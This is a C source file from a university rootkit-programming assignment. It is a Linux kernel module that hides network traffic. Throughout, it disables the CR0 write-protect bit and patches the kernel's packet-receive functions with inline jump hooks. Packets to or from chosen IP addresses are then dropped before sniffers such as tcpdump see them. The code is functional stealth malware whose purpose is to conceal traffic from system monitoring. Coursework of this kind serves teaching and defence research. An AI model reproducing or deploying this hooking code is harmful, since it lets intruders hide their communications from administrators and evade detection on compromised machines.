
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 8                                                             */
/*                                                                             */
/*   Filename: packet_masker.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage: ...                                                                */
/*                                                                             */
/*******************************************************************************/
#include "packet_masking.h"

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/inet.h>
#include <net/ip.h>
#include <linux/list.h>
#include <linux/slab.h>

#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define DEBUG_MODE_IS_ON 1
#define LOCALHOST "127.0.0.1"
#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define JUMP_CODE_SIZE 6
#define JUMP_CODE_ADDRESS_OFFSET 1
#define PRINT(str) printk(KERN_INFO "packet_masker: %s\n", (str))
#define DEBUG_PRINT(str) if (DEBUG_MODE_IS_ON) PRINT(str)


/* Definition of global variables */
static char *ip_addr = LOCALHOST;   /* The IPv4 address whose packet traffic is being masked */
LIST_HEAD(hidden_ips);

struct hidden_ip {
	unsigned int ip;
	struct list_head list;
};

static int (*original_packet_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int (*original_tpacket_rcv)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int (*original_packet_rcv_spkt)(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);

/* Locks to avoid interfering of hooking and restoring */
static spinlock_t packet_rcv_lock;
static unsigned long packet_rcv_flags;
static spinlock_t tpacket_rcv_lock;
static unsigned long tpacket_rcv_flags;
static spinlock_t packet_rcv_spkt_lock;
static unsigned long packet_rcv_spkt_flags;

/* x86 assembly code for:

   push $0x00000000   # address to be adjusted
   ret

   The above instructions result in a jump to the absolute address
   without destroying any register values */
static char jump_code[JUMP_CODE_SIZE] = {0x68, 0x00, 0x00, 0x00, 0x00, 0xc3};
static unsigned int *target = (unsigned int *) (jump_code + JUMP_CODE_ADDRESS_OFFSET);

static char original_packet_rcv_code[JUMP_CODE_SIZE];
static char original_tpacket_rcv_code[JUMP_CODE_SIZE];
static char original_packet_rcv_spkt_code[JUMP_CODE_SIZE];


/* Declaration of functions */
static void hook_packet_rcv(void);
static void unhook_packet_rcv(void);
static void hook_tpacket_rcv(void);
static void unhook_tpacket_rcv(void);
static void hook_packet_rcv_spkt(void);
static void unhook_packet_rcv_spkt(void);

static void disable_write_protect_mode(void);
static void enable_write_protect_mode(void);

static int my_packet_rcv(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int my_tpacket_rcv(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);
static int my_packet_rcv_spkt(struct sk_buff *, struct net_device *, struct packet_type *, struct net_device *);

static int packet_should_be_masked(struct sk_buff *);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces ... */
void packet_masking_init(void)
{
	original_packet_rcv = (void *) ROOTKIT_PACKET_RCV;
	original_packet_rcv_spkt = (void *) ROOTKIT_PACKET_RCV_SPKT;
	original_tpacket_rcv = (void *) ROOTKIT_TPACKET_RCV;

	/* Maintain a backup of the original JUMP_CODE_SIZE bytes of the code */
	memcpy(original_packet_rcv_code, original_packet_rcv, JUMP_CODE_SIZE);
	memcpy(original_tpacket_rcv_code, original_tpacket_rcv, JUMP_CODE_SIZE);
	memcpy(original_packet_rcv_spkt_code, original_packet_rcv_spkt, JUMP_CODE_SIZE);

	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	hook_packet_rcv();
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	hook_tpacket_rcv();
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	hook_packet_rcv_spkt();
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	DEBUG_PRINT("successfully inserted");
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original... */
void packet_masking_exit(void)
{
	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);
	unhook_packet_rcv();
	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);
	unhook_tpacket_rcv();
	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
	unhook_packet_rcv_spkt();
	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	DEBUG_PRINT("successfully removed");
}


static void hook_packet_rcv(void)
{
	disable_write_protect_mode();

	/* Set the correct jump target */
	*target = (unsigned int *) my_packet_rcv;

	/* Insert the jump code at the beginning of the function */
	memcpy(original_packet_rcv, jump_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void unhook_packet_rcv(void)
{
	disable_write_protect_mode();

	/* Restore the first JUMP_CODE_SIZE code bytes we changed */
	memcpy(original_packet_rcv, original_packet_rcv_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void hook_tpacket_rcv(void)
{
	disable_write_protect_mode();

	/* Set the correct jump target */
	*target = (unsigned int *) my_tpacket_rcv;

	/* Insert the jump code at the beginning of the function */
	memcpy(original_tpacket_rcv, jump_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void unhook_tpacket_rcv(void)
{
	disable_write_protect_mode();

	/* Restore the first JUMP_CODE_SIZE code bytes we changed */
	memcpy(original_tpacket_rcv, original_tpacket_rcv_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void hook_packet_rcv_spkt(void)
{
	disable_write_protect_mode();

	/* Set the correct jump target */
	*target = (unsigned int *) my_packet_rcv_spkt;

	/* Insert the jump code at the beginning of the function */
	memcpy(original_packet_rcv_spkt, jump_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void unhook_packet_rcv_spkt(void)
{
	disable_write_protect_mode();

	/* Restore the first JUMP_CODE_SIZE code bytes we changed */
	memcpy(original_packet_rcv_spkt, original_packet_rcv_spkt_code, JUMP_CODE_SIZE);

	enable_write_protect_mode();
}


static void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


static void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


static int my_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
	int ret;

	spin_lock_irqsave(&packet_rcv_lock, packet_rcv_flags);

	/* Check if we need to hide packet */
	if (packet_should_be_masked(skb)) {
		DEBUG_PRINT("packet is being dropped (my_packet_rcv)");
		spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

		return 0;
	}

	/* Otherwise restore original function, call it and hook it again */
	unhook_packet_rcv();
	ret = original_packet_rcv(skb, dev, pt, orig_dev);
	hook_packet_rcv();

	spin_unlock_irqrestore(&packet_rcv_lock, packet_rcv_flags);

	/* Return the correct value of the original function */
	return ret;
}


static int my_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
	int ret;

	spin_lock_irqsave(&tpacket_rcv_lock, tpacket_rcv_flags);

	if (packet_should_be_masked(skb)) {
		DEBUG_PRINT("packet is being dropped (my_tpacket_rcv)");
		spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

		return 0;
	}

	/* Otherwise restore original function, call it and hook it again */
	unhook_tpacket_rcv();
	ret = original_tpacket_rcv(skb, dev, pt, orig_dev);
	hook_tpacket_rcv();

	spin_unlock_irqrestore(&tpacket_rcv_lock, tpacket_rcv_flags);

	/* Return the correct value of the original function */
	return ret;
}


static int my_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev)
{
	int ret;

	spin_lock_irqsave(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	if (packet_should_be_masked(skb)) {
		spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);
		DEBUG_PRINT("packet is being dropped (my_packet_rcv_spkt)");

		return 0;
	}

	/* Otherwise restore original function, call it and hook it again */
	unhook_packet_rcv_spkt();
	ret = original_packet_rcv_spkt(skb, dev, pt, orig_dev);
	hook_packet_rcv_spkt();

	spin_unlock_irqrestore(&packet_rcv_spkt_lock, packet_rcv_spkt_flags);

	/* Return the correct value of the original function */
	return ret;
}

int packet_is_masked(unsigned int ip_addr)
{
	struct list_head *cursor;
	struct hidden_ip *cur;

	list_for_each(cursor, &hidden_ips) {
		cur = list_entry(cursor, struct hidden_ip, list);
		if (cur->ip == ip_addr)
			return 1;
	}

	return 0;
}


static int packet_should_be_masked(struct sk_buff *skb)
{
	struct iphdr *ip_header;

	/* Check if this frame contains an IPv4 packet */
	if (skb->protocol == htons(ETH_P_IP)) {
		/* Extract the IP header */
		ip_header = (struct iphdr *) skb_network_header(skb);

		/* Check if the masked IPv4 address is in the sender or the receiver field */
		if (packet_is_masked(ip_header->saddr) ||
			packet_is_masked(ip_header->daddr)) {
			DEBUG_PRINT("packet with masked IP address detected");

			return 1;
		}
	}

	return 0;
}

void mask_ip_traffic(char *ip_addr)
{
	u8 ipv4_bin_repr[4];
	struct hidden_ip *hip;

	if (!in4_pton(ip_addr, -1, ipv4_bin_repr, -1, NULL)) {   /* Convert the IPv4 address from literal to binary representation */
		DEBUG_PRINT("invalid IP address given as argument "
				"(try: x.x.x.x)");

		return;
	}

	if (packet_is_masked(*(unsigned int *)ipv4_bin_repr))
		return;

	DEBUG_PRINT("Masking traffic to IP\n");
	hip = kzalloc(sizeof(struct hidden_ip), GFP_KERNEL);

	hip->ip = *(unsigned int *)ipv4_bin_repr;
	list_add(&hip->list, &hidden_ips);
}

void unmask_ip_traffic(char *ip_addr)
{
	u8 ipv4_bin_repr[4];
	struct list_head *cursor, *next;
	struct hidden_ip *hip;

	if (!in4_pton(ip_addr, -1, ipv4_bin_repr, -1, NULL)) {   /* Convert the IPv4 address from literal to binary representation */
		DEBUG_PRINT("invalid IP address given as argument "
				"(try: x.x.x.x)");

		return;
	}

	cursor = next = NULL;
	list_for_each_safe(cursor, next, &hidden_ips) {
		hip = list_entry(cursor, struct hidden_ip, list);
		if (hip->ip == *(unsigned int *)ipv4_bin_repr) {
			DEBUG_PRINT("Unmasking traffic to IP\n");
			list_del(cursor);
			kfree(hip);
			break;
		}
	}
}
